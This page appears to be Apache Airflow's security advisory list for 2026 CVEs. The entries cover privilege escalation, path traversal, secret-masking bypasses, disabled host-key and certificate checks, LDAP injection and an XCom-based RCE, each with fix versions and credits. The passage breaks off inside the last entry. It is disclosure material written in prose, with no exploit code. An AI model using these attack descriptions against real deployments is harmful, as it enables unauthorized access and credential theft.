---
title: Apache Airflow security advisories
description: Security information for Apache Airflow
layout: single
---

# Reporting

Do you want disclose a potential security issue for Apache Airflow? Send your report to the [Apache Airflow Security Team](mailto:security%40airflow.apache.org?subject=%5BFINDING%5D%20Apache%20Airflow).

You can read more about the security policy on:

- [Apache Airflow security model](https://airflow.apache.org/docs/apache-airflow/stable/security/security_model.html)


# Advisories

This section is experimental: it provides advisories since 2023 and may lag behind the official CVE publications. It may also lack details found on the project security page linked above. If you have any feedback on how you would like this data to be provided, you are welcome to reach out on our public [mailinglist](/mailinglist) or privately on [security@apache.org](mailto:security@apache.org)
{.bg-warning}

## FAB auth manager: a DAG named "DAGs" hijacks the global all-DAGs permission (access_control privilege escalation via resource_name() collision) ## { #CVE-2026-59245 }

CVE-2026-59245 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-59245) [\[CVE json\]](./CVE-2026-59245.cve.json) [\[OSV json\]](./CVE-2026-59245.osv.json)



_Last updated: 2026-07-13T15:05:19.788Z_

### Affected

* Apache Airflow FAB provider before 3.7.2


### Description

In the Apache Airflow FAB auth manager, a DAG whose `dag_id` is `DAGs` collided with the global all-DAGs permission resource name produced by `resource_name()`, so a user granted per-DAG `access_control` on that one DAG was silently granted the global all-DAGs permission (privilege escalation). The escalation triggers when a DAG named `DAGs` exists and a lower-privileged user is given per-DAG access to it, granting that user read/edit access to every DAG. Users are advised to upgrade to `apache-airflow-providers-fab` 3.7.2 or later, which disambiguates the resource-name collision.

### References
* https://github.com/apache/airflow/pull/69106
* https://lists.apache.org/thread/70f37q3mwov1vm3zolrfxlzds278c78h


### Credits
* Tran Hieu (h1tr3xnull) (finder)
* Jarek Potiuk (remediation developer)


## Git provider hook defaults to StrictHostKeyChecking=no, disabling SSH host-key verification ## { #CVE-2026-58065 }

CVE-2026-58065 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-58065) [\[CVE json\]](./CVE-2026-58065.cve.json) [\[OSV json\]](./CVE-2026-58065.osv.json)



_Last updated: 2026-07-13T15:00:48.144Z_

### Affected

* Apache Airflow Git provider before 0.4.1


### Description

The Apache Airflow Git provider runs its git-over-SSH operations with `StrictHostKeyChecking=no` by default, disabling SSH host-key verification. An attacker who can intercept the network path between an Airflow worker and the Git server can impersonate the server (man-in-the-middle), capturing the SSH deploy key or injecting malicious repository content. Deployments that use the Git DAG bundle or Git provider to clone over SSH with a deploy key are affected. The fix changes the default to verify host keys; upgrade to apache-airflow-providers-git `0.4.1` or later and configure a `known_hosts` file.

### References
* https://github.com/apache/airflow/pull/69103
* https://lists.apache.org/thread/fjmclngfksz2kp7llpcjxzdz568h0zhc


### Credits
* Siyang Wu (independent researcher) (finder)
* Ephraim Anierobi (remediation developer)


## Path traversal in SFTPHook.retrieve_directory allows local file write outside the destination directory via malicious server-supplied directory-entry names ## { #CVE-2026-50203 }

CVE-2026-50203 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-50203) [\[CVE json\]](./CVE-2026-50203.cve.json) [\[OSV json\]](./CVE-2026-50203.osv.json)



_Last updated: 2026-06-17T01:48:06.460Z_

### Affected

* Apache Airflow SFTP provider before 5.8.1


### Description

A path traversal in the SFTP provider (`SFTPHook.retrieve_directory` / `SFTPOperator(operation=get)`) let a malicious or compromised remote SFTP server write files outside the configured local destination directory via crafted directory-entry names. No Airflow account is required — the attack surface is any deployment downloading directories from an untrusted SFTP server. Upgrade `apache-airflow-providers-sftp` to 5.8.1 or later.

### References
* https://github.com/apache/airflow/pull/67985
* https://lists.apache.org/thread/7f4b284oh44c1n95oq8mh1qc7y1lr9dx


### Credits
* secuholic (finder)
* Venkatraman Kumar (r3dw0lfsec), Securin (finder)
* Jarek Potiuk (remediation developer)


## Path traversal in GCSToSambaOperator via GCS object names ## { #CVE-2026-49818 }

CVE-2026-49818 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-49818) [\[CVE json\]](./CVE-2026-49818.cve.json) [\[OSV json\]](./CVE-2026-49818.osv.json)



_Last updated: 2026-06-10T17:37:51.189Z_

### Affected

* Apache Airflow Samba provider before 4.12.6


### Description

The Apache Airflow Samba provider&#x27;s `GCSToSambaOperator` joined GCS object names to the SMB destination path without a containment check, so an object named with `../` segments resolved a write path outside the configured `destination_path`. An attacker able to write objects into the source GCS bucket — typically an external data producer distinct from the trusted DAG author — could write files to arbitrary locations on the Samba target when the operator ran. Upgrade apache-airflow-providers-samba to 4.12.6 or later, which validates the resolved destination stays within `destination_path`.

### References
* https://github.com/apache/airflow/pull/67857
* https://lists.apache.org/thread/3vs0m3p51psgf54tts18d6336g24x3sf


### Credits
* secuholic (finder)
* Jarek Potiuk (remediation developer)


## Task-instance API exposes secrets in deferred trigger kwargs ## { #CVE-2026-49487 }

CVE-2026-49487 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-49487) [\[CVE json\]](./CVE-2026-49487.cve.json) [\[OSV json\]](./CVE-2026-49487.osv.json)



_Last updated: 2026-07-07T12:26:03.726Z_

### Affected

* Apache Airflow before 3.3.0


### Description

In Apache Airflow before 3.3.0, the REST API task-instance detail and list<br>endpoints returned a deferred task&#x27;s trigger kwargs without masking. When a<br>deferred operator passed a secret (for example a provider API key) into its<br>trigger, any authenticated user with DAG-scoped task-instance read access for<br>that DAG could read that secret in clear text while the task was deferred.<br>Users should upgrade to apache-airflow 3.3.0 or later, which masks sensitive<br>values in trigger kwargs returned by the API.

### References
* https://github.com/apache/airflow/pull/67868
* https://lists.apache.org/thread/qlw6pozlzlfhkvmbgqsbjlq6vj4v0pc4


### Credits
* Andrew Rukin (Arenadata) (finder)
* Jarek Potiuk (@potiuk) (remediation developer)


## FTP Provider does not protect FTPS data channel (missing PROT_P) ## { #CVE-2026-49486 }

CVE-2026-49486 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-49486) [\[CVE json\]](./CVE-2026-49486.cve.json) [\[OSV json\]](./CVE-2026-49486.osv.json)



_Last updated: 2026-06-26T07:20:08.333Z_

### Affected

* Apache Airflow FTP provider before 3.15.1


### Description

The Apache Airflow FTP provider&#x27;s `FTPSHook.get_conn()` created an `ftplib.FTP_TLS` connection but never called `prot_p()`, so although the control channel was TLS-protected the data channel was transmitted in cleartext. Any deployment using `FTPSHook` or `FTPSFileTransmitOperator` to move files over FTPS exposed file contents and credentials-in-transit to a network attacker able to observe the data connection. Upgrade apache-airflow-providers-ftp to `3.15.1` or later, which issues `PROT P` to encrypt the data channel.

### References
* https://github.com/apache/airflow/pull/67946
* https://lists.apache.org/thread/gwnsxlt9hfj5pc543wxtogbnjdn04xj1


### Credits
* Andrew Rukin (Arenadata) (finder)
* Shubham Raj (remediation developer)


## JWT Token Exposure in KubernetesExecutor Command-Line Arguments ## { #CVE-2026-49298 }

CVE-2026-49298 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-49298) [\[CVE json\]](./CVE-2026-49298.cve.json) [\[OSV json\]](./CVE-2026-49298.osv.json)



_Last updated: 2026-06-01T07:34:31.163Z_

### Affected

* Apache Airflow before 3.2.2


### Description

A bug in Apache Airflow&#x27;s KubernetesExecutor caused JWT tokens used by worker pods to authenticate against the Execution API to be passed to the worker container as command-line arguments visible in the pod spec. An authenticated UI/API user with Kubernetes read-only access to the cluster (e.g. `pods/get` in the Airflow namespace) could harvest the JWT from `kubectl describe pod` output and then call state-mutating Execution API endpoints — triggering Dag runs, clearing runs, reading or writing Variables / Connections / XComs — as if they were a running task. Affects deployments using the `KubernetesExecutor`. Users are advised to upgrade to `apache-airflow` 3.2.2 or later. This is the airflow-core half of the same vulnerability addressed by [CVE-2026-27173](https://www.cve.org/CVERecord?id=CVE-2026-27173), which shipped the apache-airflow-providers-cncf-kubernetes side of the fix. Deployments that already upgraded `apache-airflow-providers-cncf-kubernetes` to 10.17.0 or later per the CVE-2026-27173 advisory should additionally upgrade `apache-airflow` to 3.2.2 or later to close the core-side surface — the two fixes are complementary, not duplicates.

### References
* https://github.com/apache/airflow/pull/60108
* https://lists.apache.org/thread/wo09vrks8189dzsot39rvrx3vnx102tt


### Credits
* Nikolai Dvoinishnikov (nikdvy@gmail.com) (finder)
* Anton Kuznetsov (piratusxp@gmail.com) (finder)
* Anish Giri (remediation developer)


## Path traversal via GCS object names → local/SFTP filesystem (GCSToSFTPOperator + GCSTimeSpanFileTransformOperator) ## { #CVE-2026-49297 }

CVE-2026-49297 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-49297) [\[CVE json\]](./CVE-2026-49297.cve.json) [\[OSV json\]](./CVE-2026-49297.osv.json)



_Last updated: 2026-07-04T05:57:06.977Z_

### Affected

* Apache Airflow Google provider before 22.2.1


### Description

Apache Airflow&#x27;s Google provider operators `GCSToSFTPOperator` and `GCSTimeSpanFileTransformOperator` joined GCS object names returned by the bucket listing API directly to a destination filesystem path without normalisation or containment check. A user with write access to the source GCS bucket (typically a different trust principal than the DAG author — partner uploads, ingest-only service accounts, public-data buckets) could create an object whose name contains `..` segments and cause the DAG run to write the downloaded blob outside the configured destination (the SFTP `destination_path` for `GCSToSFTPOperator`; the worker-local temp directory for `GCSTimeSpanFileTransformOperator`), enabling overwrite of arbitrary files on the SFTP server or the worker host. Affects deployments that ingest from buckets writable by less-trusted principals. Users are advised to upgrade to `apache-airflow-providers-google` 22.2.1 or later.

### References
* https://github.com/apache/airflow/pull/67667
* https://lists.apache.org/thread/cb5nvoxsj1q7rv878cyqgtg150w0zglq?users@airflow.apache.org


### Credits
* anonymous (finder)
* Jarek Potiuk (remediation developer)


## Per-DAG read bypass discloses co-located DAGs' source via GET /api/v2/dagSources/{dag_id} ## { #CVE-2026-49296 }

CVE-2026-49296 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-49296) [\[CVE json\]](./CVE-2026-49296.cve.json) [\[OSV json\]](./CVE-2026-49296.osv.json)



_Last updated: 2026-07-07T12:26:02.148Z_

### Affected

* Apache Airflow from 3.0.0 before 3.3.0


### Description

Before apache-airflow 3.3.0, a user authorized to read one Dag could disclose the source of other Dags co-located in the same source file. `GET /api/v2/dagSources/{dag_id}` — and the equivalent Dag-source view in the UI — returned the entire source file without redacting Dags the caller was not authorized to read, bypassing per-DAG read authorization. Deployments that co-locate multiple Dags in a single file and rely on per-DAG access control to limit source visibility are affected; single-Dag-per-file deployments are not. Upgrade to apache-airflow 3.3.0 or later.

### References
* https://github.com/apache/airflow/pull/67662
* https://lists.apache.org/thread/qqv41t3oydkn9o14r2rfz1wkdrsp5jzn


### Credits
* Matteo Panzeri (Università di Pavia), GitHub @matte1782 (finder)
* Jarek Potiuk (remediation developer)


## No certificate validation on SMTP STARTTLS connections ## { #CVE-2026-49267 }

CVE-2026-49267 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-49267) [\[CVE json\]](./CVE-2026-49267.cve.json) [\[OSV json\]](./CVE-2026-49267.osv.json)



_Last updated: 2026-06-01T07:53:11.785Z_

### Affected

* Apache Airflow from 2.0.0 before 3.2.2


### Description

Apache Airflow&#x27;s EmailOperator and the underlying `airflow.utils.email` helpers established SMTP STARTTLS connections without verifying the remote certificate when the deployment used `[email] smtp_starttls=True` without `[email] smtp_ssl`. An attacker positioned between the worker and the configured SMTP server (network MITM — typical hostile-network attack-surface for environments where the SMTP relay sits outside the worker&#x27;s trust boundary) could present a self-signed certificate, have the worker complete the STARTTLS handshake silently, and capture the SMTP AUTH credentials and message contents the worker forwarded.<br><br>This CVE covers the **core apache-airflow side** of the same root cause already covered for the SMTP provider by `CVE-2026-41016` (published 2026-04-27, covering `apache-airflow-providers-smtp`). Users who already applied the SMTP-provider fix from CVE-2026-41016 should additionally upgrade `apache-airflow` to 3.2.2 or later to cover the core-side path through `airflow.utils.email`. Affects deployments configured with `smtp_starttls=True` and `smtp_ssl=False` where the SMTP relay is reachable across a less-trusted network segment than the worker.<br><br>Users are advised to upgrade to `apache-airflow` 3.2.2 or later.

### References
* https://github.com/apache/airflow/pull/65346
* https://lists.apache.org/thread/6v2ds757000msmjmovnnqryqzks83ps0


### Credits
* Francis Bergin (@francisbergin) (finder)
* Jarek Potiuk (remediation developer)


## Config API leaks per-key secrets backend kwargs - masker bypass on synthetic options ## { #CVE-2026-48892 }

CVE-2026-48892 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-48892) [\[CVE json\]](./CVE-2026-48892.cve.json) [\[OSV json\]](./CVE-2026-48892.osv.json)



_Last updated: 2026-07-07T12:25:58.879Z_

### Affected

* Apache Airflow before 3.3.0


### Description

The Config API in Apache Airflow surfaced per-key secrets-backend overrides (environment variables like `AIRFLOW__SECRETS__BACKEND_KWARG__SECRET_ID` and `AIRFLOW__WORKERS__SECRETS_BACKEND_KWARG__SECRET_ID`) as synthetic config options whose option names were not in `sensitive_config_values`, so the masker did not redact them. An authenticated UI/API user with Config read permission could retrieve plaintext secrets-backend credentials (Vault `role_id` / `secret_id`, etc.) from the Config API output. Affects deployments that configure secrets backends via per-key environment overrides. Users are advised to upgrade to `apache-airflow` 3.3.0 or later.

### References
* https://github.com/apache/airflow/pull/67622
* https://lists.apache.org/thread/pq5yy40079h6tzh3fxvw28dd8dbk72hk


### Credits
* Omkhar Arasaratnam (@omkhar) (finder)
* Jarek Potiuk (remediation developer)


## /ui/dependencies scheduling graph leaks unreadable Dag identifiers via trigger/sensor dep.source/dep.target ## { #CVE-2026-48891 }

CVE-2026-48891 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-48891) [\[CVE json\]](./CVE-2026-48891.cve.json) [\[OSV json\]](./CVE-2026-48891.osv.json)



_Last updated: 2026-07-07T12:26:00.634Z_

### Affected

* Apache Airflow before 3.3.0


### Description

A bug in Apache Airflow&#x27;s `/ui/dependencies` scheduling graph endpoint applied the caller&#x27;s readable-Dag filter to the top-level serialized Dag key but still emitted referenced Dag IDs through the `dep.source` and `dep.target` fields of trigger / sensor dependency entries. An authenticated UI user with read permission on some Dags could enumerate the identifiers of other Dags they were not authorized to read by inspecting the dependency graph for trigger / sensor references. Affects deployments that rely on per-Dag read scoping to keep Dag identifiers private across teams. This is a residual gap in the fix for CVE-2026-28563, which filtered the top-level Dag key but did not propagate the filter into the trigger / sensor dep-source / dep-target fields. Users who already upgraded for CVE-2026-28563 should additionally upgrade to `apache-airflow` 3.3.0 or later to cover the residual trigger / sensor dependency leak.

### References
* https://github.com/apache/airflow/pull/67627
* https://www.cve.org/CVERecord?id=CVE-2026-28563
* https://lists.apache.org/thread/wzc8nflg94rq6w8f5tvtlo0o3g4wjrfl


### Credits
* Mitchell Benjamin / Revamp Studio (finder)
* Jarek Potiuk (remediation developer)


## Bulk JSON Variables bypass should_hide_value_for_key - redact() called without the key ## { #CVE-2026-48828 }

CVE-2026-48828 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-48828) [\[CVE json\]](./CVE-2026-48828.cve.json) [\[OSV json\]](./CVE-2026-48828.osv.json)



_Last updated: 2026-07-07T12:25:57.319Z_

### Affected

* Apache Airflow before 3.3.0


### Description

The Bulk Variables API in Apache Airflow called the redactor without passing the variable&#x27;s key, so the key-based `should_hide_value_for_key` check (which triggers on secret-suffixed key names like `*_password` / `*_token` / `*_secret`) could not fire for JSON-decodable variable values. An authenticated UI/API user with bulk Variable read permission could retrieve plaintext values from JSON variables whose key would otherwise trigger redaction. Affects deployments that store sensitive values in JSON-typed Airflow Variables under secret-suffixed key names. Users are advised to upgrade to `apache-airflow` 3.3.0 or later (the fix landed on `main` after 3.2.2; no 3.2.x backport).

### References
* https://github.com/apache/airflow/pull/67495
* https://lists.apache.org/thread/y9kf314t6dhnv994hr11wj3tbow847yc


### Credits
* Omkhar Arasaratnam (@omkhar) (finder)
* Shubham Raj (@shubhamraj-git) (remediation developer)


## revoke_token() unreachable in FabAuthManager / KeycloakAuthManager logout path ## { #CVE-2026-48726 }

CVE-2026-48726 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-48726) [\[CVE json\]](./CVE-2026-48726.cve.json) [\[OSV json\]](./CVE-2026-48726.osv.json)



_Last updated: 2026-06-01T07:35:18.096Z_

### Affected

* Apache Airflow before 3.2.2


### Description

A bug in Apache Airflow&#x27;s auth manager logout handling left previously-issued JWT tokens valid after the user clicked logout in the UI: the logout flow for `FabAuthManager` and `KeycloakAuthManager` did not actually reach the underlying `revoke_token()` call, so the JWT remained accepted by the API server until its natural expiry. An attacker holding a previously-issued JWT for a logged-out user could continue to make authenticated API calls as that user. Affects deployments configured with `FabAuthManager` or `KeycloakAuthManager` (the bug does not affect SimpleAuthManager). This is a residual gap in the fix for CVE-2025-57735, which addressed cookie-side invalidation in PR #57992 / PR #61339 but did not cover the provider-side `revoke_token()` reachability in the FAB / Keycloak code paths. Users who already upgraded for CVE-2025-57735 should additionally upgrade to `apache-airflow` 3.2.2 or later to cover the FAB / Keycloak logout paths.

### References
* https://github.com/apache/airflow/pull/67289
* https://www.cve.org/CVERecord?id=CVE-2025-57735
* https://lists.apache.org/thread/630jg4z6cjkv4m2yv2ljgmf1zhdj1vqx


### Credits
* Bernardo Curi (r3ngar_bugado) (finder)
* pierrejeambrun (remediation developer)


## Event Log detail endpoint bypasses DAG-scoped event log permission filter ## { #CVE-2026-46764 }

CVE-2026-46764 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-46764) [\[CVE json\]](./CVE-2026-46764.cve.json) [\[OSV json\]](./CVE-2026-46764.osv.json)



_Last updated: 2026-06-01T07:45:46.820Z_

### Affected

* Apache Airflow before 3.2.2


### Description

The Event Log detail endpoint `GET /api/v2/eventLogs/{event_log_id}` in Apache Airflow fetched audit-log rows directly by numeric ID after only the generic Audit Log permission check, while the collection endpoint `GET /api/v2/eventLogs` applied per-Dag scoping. An authenticated UI/API user with audit-log read permission for one Dag could retrieve audit-log entries for any other Dag by guessing or enumerating the numeric event log ID. Affects deployments that rely on per-Dag audit-log scoping. Users are advised to upgrade to `apache-airflow` 3.2.2 or later.

### References
* https://github.com/apache/airflow/pull/67112
* https://lists.apache.org/thread/ctrbj7q3m86g4qxmo9ponojgmzrcoqpv


### Credits
* Stoyan Stoyanov Trendafilov (trstoyan), independent security researcher (finder)
* Pierre Jeambrun (@pierrejeambrun) (remediation developer)


## LDAP Filter Injection in FAB Auth Manager _search_ldap reachable via /auth/token ## { #CVE-2026-46745 }

CVE-2026-46745 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-46745) [\[CVE json\]](./CVE-2026-46745.cve.json) [\[OSV json\]](./CVE-2026-46745.osv.json)



_Last updated: 2026-05-25T11:30:22.680Z_

### Affected

* Apache Airflow FAB provider before 3.6.4


### Description

Apache Airflow FAB Auth Manager contains an LDAP filter injection vulnerability (CWE-90) that allows unauthenticated attackers to exfiltrate directory data or bypass authentication. Upgrade to apache-airflow-providers-fab 3.6.4 or later. If immediate upgrade is not possible, disable LDAP authentication until the provider can be updated.

### References
* https://github.com/apache/airflow/pull/66417
* https://lists.apache.org/thread/dvfy0bs181xwsrjrd3y5c55ztbzm8yhh


### Credits
* Venkatraman Kumar (r3dw0lfsec), Securin (finder)
* orbisai0security (automated scanner — Orbis Security AI) (remediation developer)


## Log server JWT authorization bypass via Python lstrip() character stripping allows cross-Dag log access ## { #CVE-2026-45426 }

CVE-2026-45426 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-45426) [\[CVE json\]](./CVE-2026-45426.cve.json) [\[OSV json\]](./CVE-2026-45426.osv.json)



_Last updated: 2026-06-01T07:47:13.162Z_

### Affected

* Apache Airflow from 3.0.0 before 3.2.2


### Description

Exploitation requires the attacker to already be an authenticated Airflow worker holding a valid Log-server JWT issued for at least one Dag. Apache Airflow&#x27;s Log server authorized JWT tokens against Dag IDs by applying Python&#x27;s `str.lstrip()` to the requested path segment when verifying the JWT&#x27;s `sub` claim. `str.lstrip()` strips any of a *set* of characters from the left (not a prefix), so a JWT issued for a Dag named e.g. `dag_a` would authorize log access to any other Dag whose name began with any subset of the characters `{d, a, g, _}` (e.g. `dag_attacker`, `aaaa_target`, `_dag_secret`). Such an authenticated worker could enumerate and read worker logs of other Dags whose names happened to share that character-class prefix, leaking task output and error traces beyond the documented per-Dag isolation boundary. Affects deployments relying on per-Dag log-access scoping (multi-team, shared-executor, shared-worker topologies). Users are advised to upgrade to `apache-airflow` 3.2.2 or later.

### References
* https://github.com/apache/airflow/pull/66749
* https://lists.apache.org/thread/hz1q7vg65vq2h4fobv5ww8tp257fbqj9


### Credits
* Michael Lip (theluckystrike) (finder)
* Jarek Potiuk (@potiuk) (remediation developer)


## SSH host key verification disabled in ComputeEngineSSHHook (paramiko AutoAddPolicy default) ## { #CVE-2026-45361 }

CVE-2026-45361 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-45361) [\[CVE json\]](./CVE-2026-45361.cve.json) [\[OSV json\]](./CVE-2026-45361.osv.json)



_Last updated: 2026-06-01T15:48:33.023Z_

### Affected

* Apache Airflow Google provider before 22.0.0


### Description

Apache Airflow providers-google&#x27;s `ComputeEngineSSHHook` disables SSH host-key verification by default, exposing SSH traffic between an Airflow worker and a Compute Engine VM to in-path network attackers who can intercept or modify the session. Users are advised to upgrade to `apache-airflow-providers-google` 22.0.0 or later.

### References
* https://github.com/apache/airflow/pull/66746
* https://lists.apache.org/thread/3lpj7ppwxp7jtp81rnxk75xvln7qd7h2?users@airflow.apache.org


### Credits
* anonymous (finder)
* Jarek Potiuk (remediation developer)


## Arbitrary import in custom deadline-reference deserialization ## { #CVE-2026-45360 }

CVE-2026-45360 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-45360) [\[CVE json\]](./CVE-2026-45360.cve.json) [\[OSV json\]](./CVE-2026-45360.osv.json)



_Last updated: 2026-06-01T07:48:10.959Z_

### Affected

* Apache Airflow before 3.2.2


### Description

Apache Airflow&#x27;s scheduler-side deadline-reference decoder (`SerializedCustomReference.deserialize_reference`) imported and dispatched arbitrary class paths drawn from DAG-author-controlled serialized state without an allowlist or plugin-registry gate. A DAG author whose code reaches the scheduler — the default on single-host deployments where the DAG bundle is importable from the scheduler process — could embed a custom `DeadlineReference` whose serialized form named an attacker-controlled module path, causing the scheduler to `import_string(...)` and instantiate that class with a live SQLAlchemy session attached. Affects deployments where DAG-author code is less trusted than the scheduler process. Users are advised to upgrade to `apache-airflow` 3.2.2 or later.

### References
* https://github.com/apache/airflow/pull/66737
* https://lists.apache.org/thread/q227dghjwgfz8xsxrf2pwpz4wk43zm83


### Credits
* Jarek Potiuk (remediation developer)


## Incomplete Redaction of Sensitive Fields in Connection Extra API Response ## { #CVE-2026-45192 }

CVE-2026-45192 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-45192) [\[CVE json\]](./CVE-2026-45192.cve.json) [\[OSV json\]](./CVE-2026-45192.osv.json)



_Last updated: 2026-06-01T06:51:50.457Z_

### Affected

* Apache Airflow before 3.2.2


### Description

A bug in the GET `/api/v2/connections/{connection_id}` REST API endpoint in Apache Airflow allowed an authenticated UI/API user with Connection-read permission to retrieve secrets stored in a Connection&#x27;s `extra` JSON blob under field names not present in the redaction allowlist (`DEFAULT_SENSITIVE_FIELDS`) — for example, official Slack-provider credential field names were returned in plaintext. Affects deployments that store credentials in Connection `extra` blobs and grant Connection-read access to multiple users. Users are advised to upgrade to `apache-airflow` 3.2.2 or later. As a defense-in-depth mitigation, deployment operators can store sensitive credential values in a secret-backend rather than inlined into the Connection&#x27;s `extra` field.

### References
* https://github.com/apache/airflow/pull/66673
* https://lists.apache.org/thread/r2q93dg2wp5h9sd9vh6y4y5ljqd9crdd


### Credits
* Or Sahar, Secure From Scratch (finder)
* Jarek Potiuk (@potiuk) (remediation developer)


## OpenSearch task-log handler leaks credentials embedded in the host URL ## { #CVE-2026-43826 }

CVE-2026-43826 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-43826) [\[CVE json\]](./CVE-2026-43826.cve.json) [\[OSV json\]](./CVE-2026-43826.osv.json)



_Last updated: 2026-05-10T20:27:25.758Z_

### Affected

* Apache Airflow Providers OpenSearch before 1.9.1


### Description

The OpenSearch logging provider, when configured with a `host` URL that embeds credentials (for example `https://user:password@server.example.com:9200`), wrote the full host URL — including the embedded credentials — into task logs. Any user with task-log read permission could harvest the backend credentials. Users are advised to upgrade to `apache-airflow-providers-opensearch` 1.9.1 or later and, as a defense-in-depth measure, configure the backend credentials via a secret backend rather than embedding them in the `[opensearch] host` URL.

### References
* https://github.com/apache/airflow/pull/65509
* https://lists.apache.org/thread/bxsrqx1vwssovnwnrvgh9xcosptmf73y


### Credits
* Aleksandr Sozinov (finder)
* Owen-CH-Leung (finder)
* Jarek Potiuk (remediation developer)


## Prevent unauthorized access to team-scoped secrets in AWS Secrets Manager and SSM Parameter Store backends ## { #CVE-2026-42526 }

CVE-2026-42526 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-42526) [\[CVE json\]](./CVE-2026-42526.cve.json) [\[OSV json\]](./CVE-2026-42526.osv.json)



_Last updated: 2026-05-20T01:48:06.454Z_

### Affected

* Apache Airflow Amazon provider before 9.28.0


### Description

In the AWS Secrets Manager and SSM Parameter Store secrets backends of `apache-airflow-providers-amazon` prior to 9.28.0, the team-scoping logic could resolve a `conn_id` containing a `/` (e.g. `&quot;my_team/conn&quot;`) to the same path as another team&#x27;s team-scoped secret when the caller had no team context. A privileged caller without team context could therefore retrieve another team&#x27;s secret by crafting a colliding `conn_id`. Fixed in 9.28.0 by switching the team-scope separator to `--` and rejecting team-shaped `conn_id`s when team context is absent. Affects the experimental multi-tenant teams feature only. Users are recommended to upgrade to `apache-airflow-providers-amazon` 9.28.0, which fixes the issue.

### References
* https://github.com/apache/airflow/pull/65703
* https://lists.apache.org/thread/0092sz5g520d3qqjb01wd61myqlgjtyn


### Credits
* Justin Pakzad (remediation developer)


## Rendered template truncation bypasses nested sensitive-key masking ## { #CVE-2026-42360 }

CVE-2026-42360 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-42360) [\[CVE json\]](./CVE-2026-42360.cve.json) [\[OSV json\]](./CVE-2026-42360.osv.json)



_Last updated: 2026-06-01T07:50:36.896Z_

### Affected

* Apache Airflow before 3.2.2


### Description

A bug in Apache Airflow&#x27;s rendered-template field handling caused nested sensitive-key masking (e.g. nested `password` / `token` / `secret` / `api_key` keys inside a JSON template structure) to be bypassed when the rendered field exceeded `[core] max_templated_field_length`: Airflow stringified the structure before redaction, losing the nested key context, and persisted the plaintext value into `rendered_fields`. An authenticated UI/API user with permission to read rendered template fields could harvest secret values intended to be masked. Affects deployments where Dag authors pass structured JSON to operators with nested sensitive keys. This is a variant of `CWE-200` previously addressed for the user-registered `mask_secret()` patterns in CVE-2025-68438; that fix did not cover the nested sensitive-keyword allowlist. Users who already upgraded for CVE-2025-68438 should additionally upgrade to `apache-airflow` 3.2.2 or later to cover the nested-key path.

### References
* https://github.com/apache/airflow/pull/65906
* https://lists.apache.org/thread/obj79bpxnl7r5olz1gsn0g94y88glnl4


### Credits
* Vincent55 (finder)
* Jarek Potiuk (remediation developer)


## Authenticated RCE via XCom PATCH endpoint — XComUpdateBody missing FORBIDDEN_XCOM_KEYS validator ## { #CVE-2026-42359 }

CVE-2026-42359 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-42359) [\[CVE json\]](./CVE-2026-42359.cve.json) [\[OSV json\]](./CVE-2026-42359.osv.json)



_Last updated: 2026-06-01T15:13:25.919Z_

### Affected

* Apache Airflow from 3.2.0 before 3.2.2


### Description

A bug in Apache Airflow&#x27;s XCom PATCH endpoint `PATCH /api/v2/xcomEntries/{key}` allowed an authenticated UI/API user with XCom write permission on a Dag to set XCom entries under reserved key names (e.g. `return_value`) that the matching POST endpoint already validated against `FORBIDDEN_XCOM_KEYS`. The endpoint also accepted serialized payload shapes the triggerer&#x27;s deserializer treats as code; combined, this allowed RCE on the triggerer when the affected task next deferred. Affects deployments where untrusted users have XCom write permission on Dags that defer to the triggerer. This is a fix-bypass of CVE-2026-33858: PR #64148 added the `FORBIDDEN_XCOM_KEYS` validator only on the POST/set path; the PATCH path was not covered. Users who already upgraded for CVE-2026-33858 should additionally upgrade to `apache-airflow` 3.2.2 or later to cover the PATCH-path bypass.

### References
* https://github.com/apache/airflow/pull/65915
* https://lists.apache.org/thread/g8dqykpf1p90tysq8tln4qtkqwb1038s
* https://www.cve.org/CVERecord?id=CVE-2026-33858


### Credits
* Jeff Vier (@boinger) (finder)
* Anisto Mejin (Izat) (finder)
* Venkatraman Kumar (r3dw0lfsec), Securin (finder)
* Jarek Potiuk (remediation developer)


## Variable masker depth-limit bypass returns cleartext nested secrets ## { #CVE-2026-42358 }

CVE-2026-42358 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-42358) [\[CVE json\]](./CVE-2026-42358.cve.json) [\[OSV json\]](./CVE-2026-42358.osv.json)



_Last updated: 2026-06-01T07:49:56.426Z_

### Affected

* Apache Airflow before 3.2.2


### Description

A bug in Apache Airflow&#x27;s Variable response masker caused nested-key redaction (triggered by secret-suffixed key names like `password`, `token`, `secret`, `api_key`) to be bypassed when the JSON value&#x27;s nesting depth exceeded the shared secrets masker&#x27;s recursion limit: the masker returned the original nested item before checking the sensitive key name. An authenticated UI/API user with Variable read permission could harvest plaintext secret values stored under sensitive keys nested deep enough to exceed the masker&#x27;s depth cap. Affects deployments that store sensitive values inside deeply-nested JSON Variables. This is a residual gap in the fix for CVE-2026-32690 (which covered shallower nesting via `max_depth=1`); the depth-limit boundary itself was not raised, so the same key-name bypass pattern reappears beyond the recursion cap. Users who already upgraded for CVE-2026-32690 should additionally upgrade to `apache-airflow` 3.2.2 or later to cover the deep-nesting path.

### References
* https://github.com/apache/airflow/pull/65912
* https://lists.apache.org/thread/33635mv3zjb75wn5453c5yf9trs8x2om


### Credits
